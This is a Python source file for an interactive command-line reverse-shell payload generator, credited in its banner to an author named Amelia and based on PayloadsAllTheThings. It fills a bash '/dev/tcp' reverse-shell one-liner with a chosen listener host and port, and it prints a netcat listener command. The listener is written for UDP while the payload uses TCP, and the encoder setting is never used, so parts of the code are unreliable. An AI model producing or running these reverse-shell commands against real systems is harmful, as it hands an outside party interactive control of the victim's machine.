import sys

banner = """
    █████████                      ███████████
    ███░░░░░███                    ░░███░░░░░███
   ███     ░░░   ██████  ████████   ░███    ░███   ██████  █████ █████
  ░███          ███░░███░░███░░███  ░██████████   ███░░███░░███ ░░███
  ░███    █████░███████  ░███ ░███  ░███░░░░░███ ░███████  ░███  ░███
  ░░███  ░░███ ░███░░░   ░███ ░███  ░███    ░███ ░███░░░   ░░███ ███
   ░░█████████ ░░██████  ████ █████ █████   █████░░██████   ░░█████
    ░░░░░░░░░   ░░░░░░  ░░░░ ░░░░░ ░░░░░   ░░░░░  ░░░░░░     ░░░░░

    █████████  █████               ████  ████    CLI Reverse Shell
   ███░░░░░███░░███               ░░███ ░░███    Payload Generator
  ░███    ░░░  ░███████    ██████  ░███  ░███
  ░░█████████  ░███░░███  ███░░███ ░███  ░███    Written by Amelia <3
   ░░░░░░░░███ ░███ ░███ ░███████  ░███  ░███
   ███    ░███ ░███ ░███ ░███░░░   ░███  ░███    https://m33ls.github.io/
  ░░█████████  ████ █████░░██████  █████ █████   https://github.com/m33ls
   ░░░░░░░░░  ░░░░ ░░░░░  ░░░░░░  ░░░░░ ░░░░░

  Based on code from https://github.com/swisskyrepo/PayloadsAllTheThings/
                                            Type 'h' or 'help' for hints.
"""

help_text = """  lhost <hostname or ip>     Choose address for the listener
  lport <port number>        Choose port number for the listener
  use <language to use>      Choose a language
  encode <optional encoder>  Optionally, encode this payload
  run                        Create the payload
  listen                     Start a listener"""

print(banner)

# check python version
# versions < 3.10 do not support match statements 
assert sys.version_info >= (3, 10), "Outdated Python version detected, please update to >= 3.10"

# set defaults
exit = False
variables = {
    "language": "bash",
    "lhost": "127.0.0.1",
    "lport": "8000",
    "encoder": "none",
}

# add new templates with format:
# "name": "script with IP_ADDR for address, and PORT for port",
templates = {"bash": "bash -i >& /dev/tcp/IP_ADDR/PORT 0>&1"}

# prompt user
def prompt():
    return input("> ").strip().lower()

# modify variable
def set_var(var, token):
    if var in variables:
        print(var + " (" + variables[var] + ") => " + token)
        variables[var] = token
    else:
        print("Error: " + var + " not found in variables")

# make payload
def run():
    payload = templates[variables["language"]]
    payload = payload.replace("IP_ADDR", variables["lhost"])
    payload = payload.replace("PORT", variables["lport"])
    print(payload)

# start listener
def listen():
    listener = "nc -u -lvp " + variables["lport"]
    print(listener)

# handle user interaction
while not exit:
    args = prompt()

    if len(args.split(" ")) >= 1:
        action = args.split(" ")[0]

        match action:
            case "run":
                run()
            case "exit":
                exit = True
            case "listen":
                listen()
            case "h":
                print(help_text)
            case "help":
                print(help_text)
            case _:
                if len(args.split(" ")) >= 2:
                    token = args.split(" ")[1]

                    match action:        
                        case "use":
                            set_var("language", token)
                        case "lhost":
                            set_var("lhost", token)
                        case "lport":
                            set_var("lport", token)
                        case "encode": 
                            set_var("encoder", token)
                        case _:
                            print("Type 'h' or 'help' for hints.")
                else:
                    print("Type 'h' or 'help' for hints.")
    else:
        print("Type 'h' or 'help' for hints.")
